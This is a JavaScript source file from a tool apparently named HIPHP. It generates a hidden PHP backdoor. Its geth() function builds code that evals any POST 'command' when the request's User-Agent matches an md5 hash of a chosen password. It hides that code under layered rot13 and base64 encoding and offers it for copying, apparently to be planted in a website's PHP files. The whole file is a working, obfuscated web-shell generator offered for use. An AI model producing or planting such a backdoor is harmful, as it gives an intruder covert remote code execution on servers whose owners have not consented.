//   |                                                         |   //
// --+---------------------------------------------------------+-- //
//   |    Code by: yasserbdj96                                 |   //
//   |    Email: yasser.bdj96@gmail.com                        |   //
//   |    GitHub: github.com/yasserbdj96                       |   //
//   |    Sponsor: github.com/sponsors/yasserbdj96             |   //
//   |    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9      |   //
//   |                                                         |   //
//   |    All posts with #yasserbdj96                          |   //
//   |    All views are my own.                                |   //
// --+---------------------------------------------------------+-- //
//   |                                                         |   //

//START{


//
function rot13(text) {
    return text.replace(/[a-z]/gi, letter => String.fromCharCode(letter.charCodeAt(0) + (letter.toLowerCase() <= 'm' ? 13 : -13)));
} 

//
function tobase64(text){
    return btoa(text);
}

//
function geth(){
    var key=document.getElementById("passwd").value;
    key = md5(key);
    code="if($_SERVER['HTTP_USER_AGENT']=='"+key+"'){echo'#"+key+"';if(isset($_POST['command'])){eval($_POST['command']);}exit;}";
    code=rot13(tobase64(rot13(tobase64(rot13(code)))));
    code="eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('"+code+"'))))));";
    php_s="/*HIPHP_HOLE_CODE START*/";
    php_e="/*HIPHP_HOLE_CODE END*/";

    document.getElementById("HIPHP_HOLE_CODE").value=php_s+"\n"+code+"\n"+php_e;
    window.location.replace('#open-HIPHP_HOLE_CODE-modal');
    //prompt("HIPHP_HOLE_CODE:",php_s+"\n"+code+"\n"+php_e);
    //return php_s+"\n"+code+"\n"+php_e;
}

function copy(){
    // Get the text field
    var copyText = document.getElementById("HIPHP_HOLE_CODE");

    // Select the text field
    copyText.select();
    copyText.setSelectionRange(0, 99999); // For mobile devices

    // Copy the text inside the text field
    navigator.clipboard.writeText(copyText.value);

    // Alert the copied text
    //alert("Copied the text: " + copyText.value);
}

//console.log(geth("123"));
//}END.